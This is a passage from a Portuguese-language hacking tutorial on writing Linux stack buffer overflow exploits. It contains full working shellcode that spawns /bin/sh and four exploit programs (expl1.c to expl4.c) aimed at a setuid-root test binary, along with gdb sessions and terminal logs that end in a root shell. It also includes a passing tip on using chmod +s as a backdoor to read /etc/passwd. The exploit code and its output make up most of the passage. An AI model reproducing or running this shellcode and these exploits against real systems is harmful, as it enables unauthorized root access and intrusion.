de NOP's,  isto farah  com que,  se o  retorno apontar  para uma intrucao NOP no
buffer,  irah  percorrer  elas  ateh chegar  ao  inicio  de  nosso shellcode,  e
,consequentemente, executar nosso codigo(shellcode). Quando chegar a parte sobre
escrita de exploits, voce entenderah na pratica o que significa isso.


Podemos agora  testar cada  um desses  dois shellcodes.Voce  pode escolher entre
qualquer um dos dois, como aqui nos estamos vendo o basico do basico, dependendo
das situacoes, um shellcode poderah ser melhor que o outro(Questao de filtros  e
etc..).Bem, mas para  nossos propositos iremos  testar nosso shellcode  usando o
segundo esquema, onde  a string /bin/sh  aparece em formato  hexadecimal.Vejamos
como fica:

/* Simples Exemplo de Shellcode com string /bin/sh em hexa
   Compile com: $gcc -o shellnova2 shellnova2.c */

#include <stdlib.h>

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

void main(){
int *retorno;
retorno = (int *)&retorno + 2;
(*retorno) = (int)shellcode;
}

O esquema na linha de comando seria:
[localhost:/]$ gcc -o shellnova2 shellnova2.c
[localhost:/]$ ./shellnova2
bash$ exit
exit

Como podemos ver perfeitamente, ele funciona bem como queriamos.

Bem amigo, espero que voce tenha  aprendido com esse texto, a escrita  basica de
shellcodes, isso para a maioria das situacao eh mais do que o necessario.Se  nao
deu para  pegar bem,  de uma  olhada no  outro texto  que fiz somente sobre esse
assunto ou mesmo nas home pages que cito no final, pode-se dizer que foi  nestes
textos que aprendi a fazer isso.Lembrando o que disse no texto sobre programacao
em sockets, que espero que tenha lido..:).."SABENDO FAZER UM, O QUE TE IMPEDE DE
FAZER TODOS??".

------------------------------
4 - FAZENDO UM STACK OVERFLOW |
------------------------------

Bem amigo, chegamos a tao  esperada hora! Muitos administradores de  rede tremem
ao ouvir essa palavra, pois sabem o que eh possivel se fazer com isso.A  escrita
de  exploits,  varia  muito,  digo  isso  porque  eh  muito  facil  exploitar um
determinado bug ou um erro de uma  funcao que recebe dados da linha de  comando,
mas eh bem dificil  as vezes quando a  situacao nao eh essa(quando  a funcao nao
recebe dados  da linha  de comando).O  que escreverei  aqui irah interessar duas
classe de programadores de exploits ( ou serah hackers??:) ), de qualquer forma,
a maioria  se limita  a escrever  exploits que  se utilizam  de bugs na linha de
comando,  mas poucos  se atentam  aos outros  tipos.Eh muito  comum dizermos  da
seguranca:"Eles sabem o que eh, mas nao sabem fazer!!" justamente porque eles se
limitam muito a overflows pela linha de comando e afins. Mas deixando o papo  de
lado,  vamos comecar  do basico,  escrevendo um  exploit para  o nosso  primeiro
programa bugado(aquele lah do inicio).

Lah no inicio, eu  coloquei um programa especifico  que enche o buffer  de nosso
programa bugado com  caracteres A, se  recorda? Agora, ao  inves de enchermos  o
buffer com caracters  'A' que soh  poderiam nos dar,quando  muito, um Denial  Of
Service,  encheremos o  buffer com  nosso codigo,  e sobrescreveremos  o return
address(endereco de  retorno) para  que ele  aponte para  o inicio  do buffer  e
consequentemente para o nosso codigo.

Vejamos um esquema antes de fazermos isso:

* Primeiro debugaremos nosso programa bugado usando o gdb.

[localhost:/]$ gdb bug1
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions.Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.This GDB was configured as "i686-pc-linux-gnulibc1"...
(no debugging symbols found)...
(gdb)

+ Em seguida executamos ele para gerar o buffer overflow.

(gdb) run `perl -e 'printf "A" x 530'`
Starting program: /tmp/bug1 `perl -e 'printf "A" x 530'`
Voce digitou
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAA!!
(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()


Prestando atencao, podemos perfeitamente ver que geramos o overflow:
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Esse 0x41 se refere aos 'A's, ele eh o numero hexa correspondente ao
caracter A.Fizemos isso mais para demonstrar que o programa possui um
bug e que voce pode perfeitamente descobrir usando o programa gdb.

Agora vem a parte mais seria, vamos pedir ao gdb para nos mostrar aonde
na memoria(em hexa) estah o nosso Stack Pointer atual.Para isso usamos
o seguinte comando:

(gdb) info all-registers
eax            0x0      0
ecx            0x80485bf        134514111
edx            0x3      3
ebx            0x0      0
esp            0xbffff838       0xbffff838
ebp            0x41414141       0x41414141
esi            0x40006394       1073767316
edi            0x8048400        134513664
eip            0x41414141       0x41414141
eflags         0x10246  66118
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb)

ou se preferir:

(gdb) info register eip
eip            0x41414141       0x41414141
(gdb) info register esp
esp            0xbffff838       0xbffff838
(gdb)


Como voce pode ver, ele mostra todos os registradores, mas no momento,
devemos nos concentrar somente em dois.O registar eip(index pointer)
que eh aonde se localiza nossos 'A's, e o registrador esp(Stack pointer)
No caso acima teremos:

(gdb) info register eip
eip            0x41414141       0x41414141

para eip (Index pointer).


(gdb) info register esp
esp            0xbffff838       0xbffff838

para esp (Stack pointer).

Bem amigo, para que tudo isso? Iremos inicialmente criar um exploit em
cima desse esp.Eu digo desse, porque ele varia, e como estamos executando
gdb, partimos do pre-suposto que vamos fazer um exploit p/ maquina local,
onde poderemos compilar nosso exploit.P/ maquinas remotas o esquema eh
diferente, pois nao teriamos permissao para usar gdb, e outra coisa, mais
embaixo veremos um metodo mais eficiente do que este, mas por enquanto,
vamos nos concentrar neste.

Bem, apos pegarmos esse endereco de esp, iremos agora montar a nosso
primeiro exploit para nosso primeiro programa bugado, o do comeco desse
txt(bug1).


--------------------------- expl1.c ----------------------------------
/* Primeiro exploit para Programa bugado 1(bug1)
   Compile com: $ gcc -o expl1 expl1.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Aqui nos definimos a instrucao NOP (explicada no final da parte
   sobre shellcodes) como sendo seu codigo em hexadecimal */

#define NOP     0x90

/* Sabemos (Sem necessitar ver o codigo-fonte) que o programa bugado
   eh detonado quando usamos mais de 512 bytes(como vimos usando perl
   ou mesmo o programa que coloquei no inicio). Entao usaremos nesse
   exemplo um buffer um pouco maior, recomenda-se nessa faixa(100 a +)
   para inserir nossos dados */

#define TAMANHO     612

/* Aqui eh o endereco de esp ou Stack pointer, que acabamos de pegar
   usando gdb acima */

#define RET     0xbffff808

/* Abaixo segue o nosso shellcode */

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

int main(int argc, char *argv[])
{
char buffer[TAMANHO];
long ret = RET;
int i, offset = 0;
long retaddr;

if(argc > 1) offset = atoi(argv[1]);

retaddr = ret + offset;

/* Enchemos retaddr com endereco de buffer */

for (i=0;i<TAMANHO;i+=4)
   *(long *)&buffer[i] = retaddr;

/* Aqui nos enchemos o buffer de NOP's */

for (i=0;i<(TAMANHO-strlen(shellcode));i++)
   *(buffer+i) = NOP;

/* Copiamos o shellcode para dentro do buffer */

memcpy(buffer+i,shellcode,strlen(shellcode));

/* Abaixo nos executamos o comando bugado com argumento em buffer */

execl("./bug1","bug1",buffer,0);
}

--------------------------------------------------------------------

Compilamos ele em seguida, normalmente:

[localhost:/]$ gcc -o expl1 expl1.c
[localhost:/]$

Antes de excutar, certifique-se que o programa bugado estah como suid
root, para ficar bem claro aos nossos propositos.

[localhost:/]$ ls -l bug1
-rwsr-sr-x   1 0        root         4202 Mar  7 04:02 bug1*

Como podemos ver no meu exemplo, ele se encontra, se aih nao tiver, como
root voce digita: $ chmod +s bug1

Para nao perder viagem, o que este comando faz eh mudar o modo de um
arquivo, o parametro +s torna o arquivo suid, ou sid, quem executar ele
estarah executando como o dono do programa, no nosso caso root.Vai um
toque, isso pode perfeitamente ser usado como backdoor, um exemplo
simples seria digitar como root: $ chmod +s /bin/cat ; depois execute cat
/etc/passwd como um usuario qualquer(nao-root).

Sim, isso nao eh um tutorial sobre backdoor!!:)..continuando com nosso
exemplo!!Sem mais suspenses, seguimos os passos abaixo!

[localhost:/]$ ls -l bug1
-rwsr-sr-x   1 0        root         4202 Mar  7 04:02 bug1*
[localhost:/]$ id
uid=1000 gid=100(users) groups=100(users)

Agora comecamos a execucao de nosso exploit, caso ele nao consiga seu
objetivo, chutamos offsets de 50 em 50.

[localhost:/]./expl1
Pulando para 0xbffff800
Voce digitouXXXXXX
XX...
[localhost:/]# ./expl1 50
....
Ilegal Instruction
[localhost:/]$ ./expl1 100
...
Segmentation fault
[localhost:/]$ ./expl1 150
...
Segmentation fault
[localhost:/]$ ./expl1 200
...
Segmentation fault
[localhost:/]$ ./expl1 250
...
Segmentation fault
[localhost:/]$ ./expl1 300
bash#id
uid=1000 gid=100(users) groups=100(users) euid=0(root) egid=0(root)


YES!!:)...Como  podemos  ver  perfeitamente,   o  exploit  funciona!  Aqui   foi
necessario  somente  sete tentativas,  eh  considerado pouco,  tem  exploits que
precisamos chutar de -5000 a 5000 de 10 em 10, por isso se faz necessario um bom
aprendizado disso tudo, logo abaixo voce  verah um exploit bem melhor para  esse
mesmo programa bugado.
Se voce nao conseguiu, continue  chutando, certefique-se se colocou o  esp(Stack
Pointer) corretamente.
Se voce conseguiu, chute outros offsets,  verah que ateh mesmo com offset  = 260
ele pode conseguir root, e tambem com 500, 600. mas se colocar um offset  grande
demais ele nao funciona.

Por isso, esse esquema  de exploitar trabalhando em  cima do Stack Pointer  dado
pelo programa bugado  via gdb nao  eh muito confiavel,  e como varia  de maquina
para  maquina, esse  esquema fica  limitado a  exploitacao local  com direito  a
compilacao de programas e uso de gdb.E  se nao tiver gdb na rede onde  voce quer
exploitar localmente?? E se nao deixarem  voce compilar um programa lah? Nao  te
derem acesso  as libs  ou nao  tiver compilador?  E se  o buffer  que voce  quer
exploitar for muito pequeno?

Bem  amigo,  demonstrarei  solucao  para estes  e  outros  problemas  no proximo
capitulo.Mas antes gostaria de dar um conselho de amigo.

Saber escrever um exploit, como podemos  ver, eh facil! Saber encontrar um  bug,
tambem eh  facil!!Fazer o  exploit funcionar  nao eh  dificil!! Essas afirmacoes
acima, dependem de cada situacao.O que estou expondo nesse arquivo texto, eh  de
conhecimento  publico, meio  mundo sabe  o que  estou escrevendo  aqui, mas  os
problemas  envolvendo  overflows  sao  varios,  e  muitas  solucoes  nao   foram
divulgadas ainda.Nao me refiro aqui,  a protecao, seguranca, ateh porque  nao eh
minha  area,  estou me  referindo  a ataques  mais  complexos, que  pouquissimas
pessoas  tem  acesso a  eles.  Consequentemente, isto  confere-lhes  poderes bem
evoluidos, no sentido  de poder facilmente  penetrar numa rede.Acho  que por uma
questao etica, devemos sim expor o  que sabemos, para que nao haja  um monopolio
da informacao.Voce amigo Newbie, estude e rale, pois sei que pode chegar  longe,
aonde  ninguem  ainda  chegou,  mas  lembre-se:  Voce   sem  outros,  eu  afirmo
novamente,"sem outros", voce jamais chegaria ou chegarah aonde deseja!!!!Uma mao
ajuda a outra, amigo!!

----------------------------------
5 - PROBLEMAS ENVOLVENDO EXPLOITS |
----------------------------------

Problemas sao um  cotidiano em nossas  vidas.De qualquer forma,  nao poderia ser
diferente envolvendo  algo que  muitos consideram  tao complexo  como escrita de
exploits para  se aproveitar  de um  buffer overflow.Eu  sou um  exemplo pratico
disso tudo, com falta  de recursos, eu tenho  penado nessa area.Mas, como  quase
tudo eh possivel(Lembre-se do filme  "MATRIX" :)!), nao devemos desanimar  e sim
levar como um desafio maior e gratificante.O exploit citado acima possui grandes
limitacoes,  de modo  que os  exemplos que  se seguem  abaixo, sao  para tentar
expandir e  melhorar o  uso dele,  espero que  em breve,  voce mesmo possa estar
implementando solucoes inovadoras para os problemas relacionados a essa area.Mas
a vida continua...

Veremos um  exploit bastante  parecido com  esse aih  de cima,  mas com  algumas
mudancas para implementar  melhor as coisas.Iremos  usar um artificio  dentro do
codigo do nosso exploit para que ele nos de a posicao do SP(Stack Pointer).

O artificio segue o esquema do programa abaixo:

-------------------------- pega_sp.c ------------------------------

/* Programa para pegar Stack Pointer */
#include <stdio.h>
#include <stdlib.h>

unsigned long pega_sp(void){
__asm__("movl %esp,%eax");
}

void main(){
printf("Eis o que estamos procurando:  0x%x \n",pega_sp());
}

-----------------------------------------------------------------

Compilando ele e executando normalmente, teremos:

[localhost:/]$ gcc -o pega_sp pega_sp.c
[localhost:/]$ ./pega_sp
Eis o que estamos procurando:  0xbffffa28
[localhost:/]$


Como podemos perfeitamente ver, existe uma diferenca entre o SP achado via gdb e
o SP achado via esse  programa.Essa diferenca pode perfeitamente ser  compensada
no acrescimento ou decrescimo  de offsets na linha  de comando em busca  do real
endereco  de retorno.Como  o SP  eh variavel(muda  de maquina  para maquina,  de
programa p/ programa), este  codigo eh bastante util  aonde nao se tem  acesso a
captura do  SP facilmente,  como por  exemplo, em  exploits remotos  ou em redes
aonde nao podemos compilar um programa.

Inserindo esse codigo no nosso exploit, teremos entao um novo esquema com
a retirada do SP definido(o que pegamos via gdb).Vejamos como fica:

------------------------------ expl2.c ----------------------------------
/* Segundo Exemplo de exploit para sobrescrever primeiro programa
   bugado do tutorial sobre overflows.
   Se utitiliza do metodo de pegar o SP(Stack Pointer) via codigo
   inserido no proprio exploit abaixo.
   Desenvolvido por Nash Leon.
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Definimos o NOP(0x90) e o Tamanho do buffer(+ ou - 100 bytes maior
   que o que nos queremos sobrescrever */

#define NOP        0x90
#define TAMANHO     612

/* Aqui entra nosso artificio para tentarmos pegar a posicao de SP */

unsigned long pega_sp(void){
__asm__("movl %esp, %eax");
}

/* Nosso shellcode padrao */

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec"
  "\x5d\xc3";

int main(int argc, char *argv[])
{
char buffer[TAMANHO];
int i, offset = 0;
long retaddr;

if(argc > 1) offset = atoi(argv[1]);

/* Para pegarmos o real return address(endereco de retorno) manipulando
   nosso esquema para pegar SP com diminuicao de offsets.Voce poderia
   colocar para somar, mas nesse caso, com esse esquema, eh melhor
   colocarmos com diminuicao,para nao chutarmos offsets negativos */

retaddr = pega_sp() - offset;

/* Colocamos buffer no endereco de retorno */

for (i=0;i<TAMANHO;i+=4)
   *(long *)&buffer[i] = retaddr;

/* Enchemos uma parte do buffer com NOP's */

for (i=0;i<(TAMANHO-strlen(shellcode)-100);i++)
   *(buffer+i) = NOP;

/* Copiamos shellcode sobre buffer */

memcpy(buffer+i,shellcode,strlen(shellcode));

/* Finalmente executamos o programa */

execl("./bug1","bug1",buffer,0);
}
-----------------------------------------------------------------------

Em seguida compilamos e executamos o dito cujo.

[localhost:/]$ gcc -o expl2 expl2.c
[localhost:/]$ ./expl2
Voce digitou ...
....
bash# exit
exit

Bingo!!!:)..logo de primeira aqui! Caso  nao tenha conseguido, chute offsets  de
50 em 50.

Como  voce  pode  ver  aih,  ele eh  bem  mais  interessante  do  que o  esquema
anterior.Mas vale uma  observacao:O que mais  influenciou para que  este exploit
funcionasse  bem desse  jeito nao  foi exatamente  o artificio  para pegarmos  o
endereco de SP, e sim o tamanho do buffer que estamos manipulando, no nosso caso
612.Escolhemos esse numero porque tinhamos conhecimento de com quantos bytes  em
media o buffer estourava, recorda aih do teste inicial lah do inicio para vermos
se o programa bug1  era vulneravel a um  overflow! Eh aconselhavel que  antes de
escrever um exploit, voce tenha ideia de quando mais ou menos ocorre o overflow,
mas se isso nao for possivel, voce pode perfeitamente alterar os exploits  acima
para que recebam dados(tamanho do buffer) pela propria linha de comando, mas aih
o exploit nao ficaria tao bem otimizado. Em todo caso abaixo segue um exemplo do
mesmo exploit acima, mas desta vez  recebendo o tamanho do buffer pela  linha de
comando(argv[1]).
Vejamos:

---------------------------- expl3.c ----------------------------------
/* Terceiro exemplo de exploit para primeiro programa bugado(bug1).
   Nesse exemplo a inovacao eh por conta do recebimento do tamanho
   do buffer via linha de comando(argv[1]).
   Desenvolvido por Nash Leon.
*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Boa e velha instrucao NOP em linux */

#define NOP     0x90

/* Para pegarmos o Stack Pointer */

unsigned long pega_sp(void){
__asm__("movl %esp, %eax");
}

/* Testaremos dessa ver com esse shellcode, mas voce pode perfeitamente
   usar o anterior ou qualquer um que tiver ou desejar */

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(int argc, char *argv[])
{
char *buffer;
long retaddr;
int i ,tamanho = 0, offset = 0;

if(argc < 2){
printf("Exploit Exemplo 3 do tutorial sobre overflows!!\n");
printf("http://unsekurity.virtualave.net/\n");
printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
printf("Obs:Digite o tamanho do buffer!!\n\n");
exit(0);
}
if (argc > 1) {
tamanho = atoi(argv[1]);
}
if (argc > 2) {
offset = atoi(argv[2]);
}

if(!(buffer = malloc(tamanho))){
fprintf(stderr,"Nao pode alocar mamoria!!\n");
exit(1);
}

retaddr = pega_sp() - offset;

/* Colocamos buffer no endereco de retorno */

for (i=0;i<tamanho;i+=4)
   *(long *)&buffer[i] = retaddr;

/* Enchemos uma parte do buffer com NOP's */

for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
   *(buffer+i) = NOP;

/* Copiamos shellcode sobre buffer */

memcpy(buffer+i,shellcode,strlen(shellcode));

/* Finalmente executamos o programa */

execl("./bug1","bug1",buffer,0);
}
-----------------------------------------------------------------

Agora nos compilamos e executamos nosso exploit:

[localhost:/]$ gcc -o expl3 expl3.c
[localhost:/]$ ./e3
Exploit Exemplo 3 do tutorial sobre overflows!!
http://unsekurity.virtualave.net/
Uso: ./e3 <tamanho_do_buffer> <offset>
Obs:Digite o tamanho do buffer!!

[localhost:/]$ ./e3 200
Voce digitou 1UØ@I
èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!

[localhost:/]$ ./e3 400
Voce digitou 1UØ@I
èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!

[localhost:/]$ ./e3 500
Voce digitou 1UØ@I
èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿ú
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿ÿ¿!!

[localhost:/]$ ./e3 600
Voce digitou 1UØ@I
èÜÿÿÿ/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ
ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿ú
úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿!!ÿ¿ÿ¿!!
bash#id
uid=1000 gid=100(users) groups=100(users) euid=0(root) egid=0(root)
bash# exit
exit

:)..Como  podemos  ver foi  facil,  chutamos poucos,  de  100 em  100,  para nao
escrever mais linhas...esse texto jah estah grande demais, mas de qualquer forma
vai  um  conselho.Quando receber  aquela  velha mensagem  que  disse no  inicio,
"Segmentation fault" , saiba que voce jah estourou o buffer.Entao tente diminuir
o tamanho do buffer ateh que voce  nao receba mais essa mensagem aih voce  terah
ideia mais ou menos  de onde de fato  ocorre o overflow.De posse  dessa ideia eh
soh mandar brasa.

Veremos agora mais um  exploit para nosso programa  bugado, soh que usaremos  um
artificio que optimizarah  nosso exploit, fazendo  com que diminua  ainda mais o
nosso trabalho.Iremos manipular mais dados para que o endereco de retorno aponte
mais precisamente para aonde nos queremos.Vejamos:

------------------------------expl4.c------------------------------
/* QUARTO EXEMPLO DE EXPLOIT PARA PRIMEIRO PROGRAMA BUGADO.
   SE UTILIZADA DE ALINHAMENTO EM BUSCA DE MELHORAR O
   APONTAMENTO DO ENDERECO DE RETORNO PARA NOSSO CODIGO */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP     0x90

/* Aqui nos definimos o alinhamento, jah para voce ir se
  acostumando..:).. */

#define ALIGN      0

/* Pegamos o Stack Pointer */

unsigned long pega_sp(void){
__asm__("movl %esp, %eax");
}

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(int argc, char *argv[])
{
char *buffer;
long retaddr;
int i ,tamanho = 0, offset = 0;

if(argc < 2){
printf("Exploit Exemplo 4 do tutorial sobre overflows!!\n");
printf("http://unsekurity.virtualave.net/\n");
printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
printf("Obs:Digite o tamanho do buffer!!\n\n");
exit(0);
}
if (argc > 1) {
tamanho = atoi(argv[1]);
}
if (argc > 2) {
offset = atoi(argv[2]);
}

if(!(buffer = malloc(tamanho))){
fprintf(stderr,"Nao pode alocar mamoria!!\n");
exit(1);
}

retaddr = pega_sp() - offset;

/* Colocamos buffer no endereco de retorno usando o artificio
   de deslocamento de bits para a direita, no intuito de agilizar
   ainda mais nosso processo.Para voce entender bem o que significa
   isso aih, vejamos:
   n = 2; onde 2 em binario eh 10;
   n << 4; agora n terah representacao binaria igual a 100000
                                                    10 + 4 zeros.
   E a operacao logica & equivale a && soh que eh usada em operacoes
   logica bit-a-bit.
  */

for (i=0;i<tamanho;i+=4)

       {
                buffer[i+ALIGN]=(retaddr&0x000000ff);
                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
        }

/* Enchemos uma parte do buffer com NOP's */

for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
   *(buffer+i) = NOP;

/* Copiamos shellcode sobre buffer */

memcpy(buffer+i,shellcode,strlen(shellcode));

/* Finalmente executamos o programa */

execl("./bug1","bug1",buffer,0);
}
-----------------------------------------------------------------

Compilamos ele e em seguida testamos.

[localhost:/]$ gcc -o expl4 expl4.c
[localhost:/]$ ./expl4
Exploit Exemplo 4 do tutorial sobre overflows!!
http://unsekurity.virtualave.net/
Uso: ./e5 <tamanho_do_buffer> <offset>
Obs:Digite o tamanho do buffer!!

[localhost:/]$ ./expl 520
Voce digitou....
¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
/bin/shúÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿úÿ¿ú
bash#exit
exit

YES!!!!!!:) Como podemos ver, esse esquema eh muito eficiente quando temos nocao
de  onde ocorre  o overflow,  ele explora  mesmo muitos  chutes de  buffers sem
precisar de offsets, voce pode testar com varios, vah testando chutando de 10 em
10, de 517 ateh lah por 600, 610.Voce pode ateh mesmo chutar bem mais o  tamanho
do buffer, mas aih  poderah ter que chutar  offsets, e quanto mais  longe disso,
melhor!!!

Aos poucos estamos conseguindo solucionar varios problemas e aperfeicoando ainda
mais  a  escrita  de  nossos  exploits.Mas  podem  surgir  ainda  mais  e   mais
problemas,nao se  desanime, se  aprendeu tudo  aih em  cima o  que segue  eh soh
completo, voce estarah se munindo cada  vez mais, e breve estarah capacitado  p/
enfrentar  muitas situcoes  que podem  dificultar nossos  buffers overflows.Nos
exemplos citados  acima, os  buffers(bloco de  memoria), onde  eram guardadas as
variaveis no programa bugado possuiam o tamanho de 512 bytes.Isto eh considerado
grande.Logico, dependendo da  ocasiao, tem programas  com bem mais  do que isso,
mas  eu me  refiro que  num buffer  deste tamanho,  nos nao  temos problemas  em
inserir nosso codigo, mas e se o buffer for menor, se for bem pequeno?

Veremos agora um exemplo  de um pequeno buffer.Existem  casos em que os  buffers
sao tao pequenos  que nosso shellcode  nao cabem neles,  entao a primeira  vista
parece um enorme empecilho,  sem duvida que eh,  mas ha uma solucao!No  mundo da
informatica, ainda mais nesse onde os fucadores trabalham, pesquisam e etc,  nao
existe a palavra impossivel, a teoria de hoje pode ser a pratica de amanha.

Para podermos sobrescrever  um buffer desse  tipo, devemos entao  colocar nossos
